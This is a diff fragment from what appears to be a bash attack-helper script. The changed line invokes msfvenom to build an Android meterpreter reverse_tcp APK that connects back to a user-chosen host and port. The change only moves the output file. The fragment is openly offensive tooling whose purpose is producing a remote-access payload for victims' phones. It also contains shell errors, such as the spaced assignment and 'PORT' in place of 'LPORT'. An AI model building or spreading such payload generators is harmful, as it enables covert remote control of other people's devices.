@@ -52,7 +52,7 @@ if [[ $a == 1 ]]; then
              echo $(clear)
              echo -e "\e[31m+++++++++++++++++++++++++++++++++++++++++Generating Payload++++++++++++++++++++++++++++++++++++++++++++++++++++++=\e[0m"
              sleep 5
-             payload = $(msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip PORT=$port -o /home/kali/Desktop/android1.apk)
+             payload = $(msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip PORT=$port -o android1.apk)
              echo -e "\e[31m+++++++++++++++++++++++++++++++++++++++++Payload is Ready++++++++++++++++++++++++++++++++++++++++++++++++++++++=\e[0m"
              echo $(ls | grep android1.apk)
              echo $(mv android1.apk /Desktop)
